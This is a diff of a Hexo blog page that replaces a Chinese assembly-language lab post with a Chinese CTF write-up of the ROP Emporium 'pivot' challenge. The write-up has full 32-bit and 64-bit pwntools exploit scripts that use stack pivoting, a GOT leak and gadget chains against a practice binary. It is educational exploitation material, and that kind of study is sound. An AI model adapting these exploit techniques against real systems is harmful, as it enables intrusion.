@@ -77,7 +77,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2025/11/03/“汇编语言王爽（第4版）-实验13”/"/>
+    <link rel="canonical" href="http://example.com/2025/11/23/rop-emporium-pivot/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -87,16 +87,16 @@
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="“汇编语言王爽（第4版）--实验13”">
-<meta property="og:url" content="http://example.com/2025/11/03/%E2%80%9C%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%8E%8B%E7%88%BD%EF%BC%88%E7%AC%AC4%E7%89%88%EF%BC%89-%E5%AE%9E%E9%AA%8C13%E2%80%9D/index.html">
+<meta property="og:title" content="rop-Emporium-pivot">
+<meta property="og:url" content="http://example.com/2025/11/23/rop-Emporium-pivot/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
-<meta property="article:published_time" content="2025-11-03T11:47:15.000Z">
-<meta property="article:modified_time" content="2025-11-09T08:16:39.187Z">
+<meta property="article:published_time" content="2025-11-23T06:33:47.000Z">
+<meta property="article:modified_time" content="2025-11-23T07:00:25.325Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="learning-rookie">
+<meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
     
@@ -110,7 +110,7 @@
     
     <title>
         
-            “汇编语言王爽（第4版）--实验13” | A1ex&#39;s blogs.
+            rop-Emporium-pivot | A1ex&#39;s blogs.
         
     </title>
 
@@ -380,7 +380,7 @@
 		<div class="article-title relative w-full">
 			
 			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">“汇编语言王爽（第4版）--实验13”</h1>
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">rop-Emporium-pivot</h1>
 			</div>
 			
 		</div>
@@ -401,15 +401,15 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2025-11-03 19:47:15</span>
-        <span class="mobile">2025-11-03 19:47:15</span>
+        <span class="desktop">2025-11-23 14:33:47</span>
+        <span class="mobile">2025-11-23 14:33:47</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-11-09 16:16:39</span>
-            <span class="mobile">2025-11-09 16:16:39</span>
+            <span class="desktop">2025-11-23 15:25</span>
+            <span class="mobile">2025-11-23 15:25</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -421,7 +421,7 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/learning-rookie/">learning-rookie</a>&nbsp;
+                        <a href="/tags/PWN/">PWN</a>&nbsp;
                     </li>
                 
             </ul>
@@ -447,26 +447,16 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<p>该实验为编写并安装int 7ch中断例程，显示一个用0结束的字符串，并将中断例程安装到0:200处</p>
-<p>测试程序t1.asm用于触发7ch中断</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">  db &quot;welcome to masm! &quot;,0</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">  start: mov dh,10</span><br><span class="line">  mov dl,10</span><br><span class="line">  mov cl,2</span><br><span class="line">  mov ax,data</span><br><span class="line">  mov ds,ax</span><br><span class="line">  mov si,0</span><br><span class="line">  int 7ch</span><br><span class="line">  mov ax,4c00h</span><br><span class="line">  int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></div>
+			<h1 id="ROP-Emporium-挑战之pivot"><a href="#ROP-Emporium-挑战之pivot" class="headerlink" title="ROP_Emporium 挑战之pivot"></a>ROP_Emporium 挑战之pivot</h1><p>本挑战分为64位和32位的，核心思路是由于溢出的空间不足，因此需要使用stack pivoting的技术进行栈转移，将程序流转移到足够我们利用的空间</p>
+<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><h3 id="32位pivot"><a href="#32位pivot" class="headerlink" title="32位pivot"></a>32位pivot</h3><p>1.我们拿到程序后，首先还是检查他的二进制文件的保护设置，题目给了3个文件，分别是flag、lib和二进制程序，我们查看二进制程序发现只开启了NX，而lib开启了随机化。</p>
+<p>2.使用ida查看后，发现在pwnme函数中存在栈溢出。</p>
+<p>3.运行程序，使用pwngdb检查溢出大小，根据cyclic判断出溢出大小是44，且程序第一步让我们向一个开辟的堆空间中写入任意值</p>
+<p>4.要利用stack pivoting，我们可以将构造的栈放在第一步中，我们的目标是调用ret2win函数，但是我们并不知道这个函数在内存中的位置，同时，lib中还有一个函数foothold_function函数，我们可以利用got泄漏这个函数的地址，然后通过计算相对偏移，得到ret2win的位置，再最后调用ret2win。（注意：这里所有的工作都在我们预构造的栈中执行。因此我们要找到多个gadgets来辅助我们完成这个工作）</p>
+<p>5.构造好后，就是简单的利用，溢出后覆盖ebp地址为我们写入栈的地址，然后通过leave；ret的功能跳转过去执行</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line">context.bits = <span class="number">32</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pivot32&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pivot32&#x27;</span>)</span><br><span class="line">lib = ELF(<span class="string">&#x27;./libpivot32.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#这下面的均是需要使用ROPgadgets工具或者pwngdb中的rop功能查找的</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x080485f5</span> <span class="comment"># leave;ret</span></span><br><span class="line">pop_eax = <span class="number">0x0804882c</span> <span class="comment"># pop eax; ret</span></span><br><span class="line">pop_ebx = <span class="number">0x0804889b</span> <span class="comment"># pop ebx; ret</span></span><br><span class="line">mov_eax_eax = <span class="number">0x08048830</span> <span class="comment"># mov eax, dword ptr [eax] ; ret</span></span><br><span class="line">add_eax_ebx = <span class="number">0x08048833</span> <span class="comment"># mov eax,ebx ; ret</span></span><br><span class="line">call_eax = <span class="number">0x080485f0</span> <span class="comment"># call eax</span></span><br><span class="line"></span><br><span class="line">foothold_plt = elf.plt[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">foothold_got = elf.got[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">offset = <span class="built_in">int</span>(lib.sym[<span class="string">&#x27;ret2win&#x27;</span>] - lib.sym[<span class="string">&#x27;foothold_function&#x27;</span>])</span><br><span class="line">leak_addr = <span class="built_in">int</span>(io.recv().split()[<span class="number">20</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_1</span>():</span><br><span class="line"></span><br><span class="line"><span class="comment"># 核心思路：1.执行foothold函数的plt后，由于延迟绑定，此时foothold_got会指向真正的函数地址了</span></span><br><span class="line"><span class="comment"># 2. pop eax 是将got的地址存放到eax中，而mov eax eax，是取出eax（got）指向的地址，给到eax，也就是现在eax就等于footh函数地址</span></span><br><span class="line"><span class="comment"># 3.将偏移取出给到ebx，然后将eax + ebx == 函数真实地址+ （两个函数相对地址的差值）== 对应函数在内存中的真实地址</span></span><br><span class="line"><span class="comment"># 4.调用eax，此时eax就是你想访问的函数的真实地址</span></span><br><span class="line">    payload = p32(foothold_plt)</span><br><span class="line">    payload += p32(pop_eax)</span><br><span class="line">    payload += p32(foothold_got)</span><br><span class="line">    payload += p32(mov_eax_eax)</span><br><span class="line">    payload += p32(pop_ebx)</span><br><span class="line">    payload += p32(offset)</span><br><span class="line">    payload += p32(add_eax_ebx)</span><br><span class="line">    payload += p32(call_eax)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_2</span>():</span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span>*<span class="number">40</span> </span><br><span class="line">    payload += p32(leak_addr - <span class="number">4</span>) <span class="comment"># ebp ，因为程序真实偏移为44，40为a，40-44是ebp</span></span><br><span class="line">    payload += p32(leave_ret)   <span class="comment">#ebp-4</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;ROPE&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(io.recvall())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload_1()</span><br><span class="line">    payload_2()</span><br></pre></td></tr></table></figure></div>
 
-<p>我们分析一下安装 int 7ch的主要步骤</p>
-<ol>
-<li>编写中断例程处理代码</li>
-<li>拷贝整个处理代码到0:200h</li>
-<li>覆盖7ch的地址，使之指向0:200h</li>
-</ol>
-<p>由此，可以得到一下代码</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line"></span><br><span class="line">  ;复制中断列程处理代码</span><br><span class="line">  mov ax,cs</span><br><span class="line">  mov ds,ax</span><br><span class="line">  mov si,offset do0</span><br><span class="line">  mov ax,0</span><br><span class="line">  mov es,ax</span><br><span class="line">  mov di,200h</span><br><span class="line">  mov cx,offset do0End - offset do0</span><br><span class="line">  cld</span><br><span class="line">  rep movsb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ;修改中断向量表</span><br><span class="line"></span><br><span class="line">  mov ax,0</span><br><span class="line">  mov es,ax</span><br><span class="line">  mov word ptr es:[7ch*4],200h</span><br><span class="line">  mov word ptr es:[7ch*4+2],0  </span><br><span class="line">  mov ax, 4c00h ;复制完成后就退出</span><br><span class="line">  int 21h</span><br><span class="line"></span><br><span class="line">  ;实现输出显示在屏幕</span><br><span class="line"></span><br><span class="line">do0:</span><br><span class="line"> </span><br><span class="line">  mov bl,cl</span><br><span class="line">  mov ax,0b800h</span><br><span class="line">  mov es,ax</span><br><span class="line">  mov di,10*160+36*10 ;屏幕中间显示</span><br><span class="line">  mov cx,17</span><br><span class="line">  s: mov al,[si]  ;循环从ds中提取数据写入缓冲区</span><br><span class="line">  mov ah,bl</span><br><span class="line">  mov es:[di],ax</span><br><span class="line">  inc si</span><br><span class="line">  add di,2</span><br><span class="line">  loop s</span><br><span class="line"></span><br><span class="line">  iret</span><br><span class="line"></span><br><span class="line">do0end:</span><br><span class="line">  nop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></div>
-
-<p>最终呈现效果：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../../../images/blogImage/shiyan13.png"
-                      alt="img" title="实验13-结果"
-                ></p>
+<p>64位：与上面的思路基本相同，只是要注意不是4位大小，而是8位，同时要修改对应的gadgets</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.bits = <span class="number">64</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">lib = ELF(<span class="string">&#x27;./libpivot.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x00000000004008ef</span> <span class="comment"># leave;ret</span></span><br><span class="line">pop_rax = <span class="number">0x00000000004009bb</span> <span class="comment"># pop rax; ret</span></span><br><span class="line">pop_rbp = <span class="number">0x00000000004007c8</span> <span class="comment"># pop rbp ; ret</span></span><br><span class="line">mov_rax_rax = <span class="number">0x00000000004009c0</span> <span class="comment"># mov rax, qword ptr [rax] ; ret</span></span><br><span class="line">add_rax_rbp = <span class="number">0x00000000004009c4</span> <span class="comment"># add rax, rbp ; ret</span></span><br><span class="line">call_rax = <span class="number">0x00000000004006b0</span> <span class="comment"># call rax</span></span><br><span class="line"></span><br><span class="line">foothold_plt = elf.plt[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">foothold_got = elf.got[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">offset = <span class="built_in">int</span>(lib.sym[<span class="string">&#x27;ret2win&#x27;</span>] - lib.sym[<span class="string">&#x27;foothold_function&#x27;</span>])</span><br><span class="line">leak_addr = <span class="built_in">int</span>(io.recv().split()[<span class="number">20</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_1</span>():</span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span> * <span class="built_in">int</span>(context.bits/<span class="number">8</span>)</span><br><span class="line">    payload += p64(foothold_plt)</span><br><span class="line">    payload += p64(pop_rax)</span><br><span class="line">    payload += p64(foothold_got)</span><br><span class="line">    payload += p64(mov_rax_rax)</span><br><span class="line">    payload += p64(pop_rbp)</span><br><span class="line">    payload += p64(offset)</span><br><span class="line">    payload += p64(add_rax_rbp)</span><br><span class="line">    payload += p64(call_rax)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">g_nBufOverflowIndex = <span class="number">0x28</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_2</span>():</span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span> * <span class="number">32</span></span><br><span class="line">    payload += p64(leak_addr) <span class="comment"># ebp</span></span><br><span class="line">    payload += p64(leave_ret)   <span class="comment">#ebp-4</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;ROPE&quot;</span>)</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">print</span>(io.recv(timeout=<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload_1()</span><br><span class="line">    payload_2()</span><br></pre></td></tr></table></figure></div>
 
 		</div>
 
@@ -474,18 +464,18 @@
 		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
 			<div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> “汇编语言王爽（第4版）--实验13”</li>
+        <li><strong>Title:</strong> rop-Emporium-pivot</li>
         <li><strong>Author:</strong> A1ex</li>
         <li><strong>Created at
-                :</strong> 2025-11-03 19:47:15</li>
+                :</strong> 2025-11-23 14:33:47</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-11-09 16:16:39
+                    :</strong> 2025-11-23 15:00:25
             </li>
         
         <li>
-            <strong>Link:</strong> https://havenoideal123.github.io/2025/11/03/“汇编语言王爽（第4版）-实验13”/
+            <strong>Link:</strong> https://havenoideal123.github.io/2025/11/23/rop-Emporium-pivot/
         </li>
         <li>
             <strong>
@@ -507,7 +497,7 @@
 		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
 			
 			<li class="tag-item mx-0.5">
-				<a href="/tags/learning-rookie/">#learning-rookie</a>&nbsp;
+				<a href="/tags/PWN/">#PWN</a>&nbsp;
 			</li>
 			
 		</ul>
@@ -519,12 +509,12 @@
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
 			
 			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2025/11/06/%E5%B0%8F%E5%9E%8B%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BD%E7%A8%8B%E5%BA%8F-md/">
+				<a class="prev" rel="prev" href="/2025/11/23/grehack-ctf-2017-beerfighter/">
 					<span class="left arrow-icon flex justify-center items-center">
 						<i class="fa-solid fa-chevron-left"></i>
 					</span>
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">小型内核加载程序.md</span>
+						<span class="post-nav-title-item truncate max-w-48">grehack-ctf-2017_beerfighter</span>
 						<span class="post-nav-item">Prev posts</span>
 					</span>
 				</a>
@@ -532,9 +522,9 @@
 			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2025/10/30/helloworld-md/">
+				<a class="next" rel="next" href="/2025/11/21/njctf2017-pingme/">
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">helloworld.md</span>
+						<span class="post-nav-title-item truncate max-w-48">njctf2017-pingme</span>
 						<span class="post-nav-item">Next posts</span>
 					</span>
 					<span class="right arrow-icon flex justify-center items-center">
@@ -609,8 +599,8 @@
 		<div class="post-toc-wrap">
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
-		<div class="page-title">“汇编语言王爽（第4版）--实验13”</div>
-		
+		<div class="page-title">rop-Emporium-pivot</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ROP-Emporium-%E6%8C%91%E6%88%98%E4%B9%8Bpivot"><span class="nav-text">ROP_Emporium 挑战之pivot</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#wp"><span class="nav-text">wp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#32%E4%BD%8Dpivot"><span class="nav-text">32位pivot</span></a></li></ol></li></ol></li></ol>
 
 	</div>
 </div>
